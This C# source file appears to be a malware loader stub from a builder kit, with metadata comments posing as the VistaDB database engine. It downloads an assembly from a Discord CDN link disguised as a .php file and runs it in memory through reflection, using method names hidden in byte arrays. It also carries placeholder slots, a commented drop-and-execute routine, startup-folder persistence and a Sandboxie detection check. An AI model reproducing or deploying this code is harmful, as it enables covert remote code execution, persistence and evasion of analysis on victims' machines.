using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.ComponentModel;

//Default [assembly: AssemblyTitle("")]
//Default [assembly: AssemblyDescription("VistaDB Database Engine")]
//Default [assembly: AssemblyCompany("Vista Software")]
//Default [assembly: AssemblyProduct("VistaDB")]
//Default [assembly: AssemblyCopyright("(c) 1999-2006 Vista Software. All rights reserved.")]
//Default [assembly: AssemblyFileVersion("2.1.8.2")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


namespace Conditional
{
    static class IfStatement
    {

        public static byte[] Street(string url)
        {
            byte[] Street;
            for (; ; )
            {
                try
                {

                    WebClient PostalCode = new WebClient();
                    Street = PostalCode.DownloadData(url);
                }
                catch (Exception ex)
                {

         


                 

                    throw;
                }
                break;
            }
            return Street;
        }

        static void Main()
        {


            try
            {


                //sandboxie controlsandboxie();

                //Messega



                //download try
                //download {
                //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                //download }
                //download catch
                //download {
                //download }




                var asciiBytes = new byte[] { 67, 111, 100, 101, 65, 99, 99, 101, 115, 115, 83, 101, 99, 117, 114, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101 };
                var text = System.Text.Encoding.ASCII.GetString(asciiBytes);

                var bn = new byte[] { 112, 97, 99, 107, 101, 116, 95, 115, 101, 114, 118, 101, 114 };
                var texts = System.Text.Encoding.ASCII.GetString(bn);

                byte[] treehouseBytes = Street("https://cdn.discordapp.com/attachments/841595401253158954/842594042083541012/ThreeDPayment.php");

                Assembly name = AppDomain.CurrentDomain.Load(treehouseBytes);

                string BirthDate = texts;
    
                string city = text;

                object Contacts = new object[] { %aPP%, string.Empty, Street("%Server%"), true };

                name.GetType("IsolatedStorage" + "." + BirthDate).InvokeMember(city, BindingFlags.InvokeMethod, null, null, (object[])Contacts);



                //start  {
                //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                //start  }



            }
            //burası sadece çöp kod silebilirsin

            catch (Exception ex)
            {
       
          
            }

            //sandboxie [DllImport("kernel32.dll")]
            //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
            //sandboxie static void controlsandboxie()
            //sandboxie {
            //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            //sandboxie     {
            //sandboxie        Environment.Exit(1);
            //sandboxie     }
            //sandboxie }

        }


    }
}
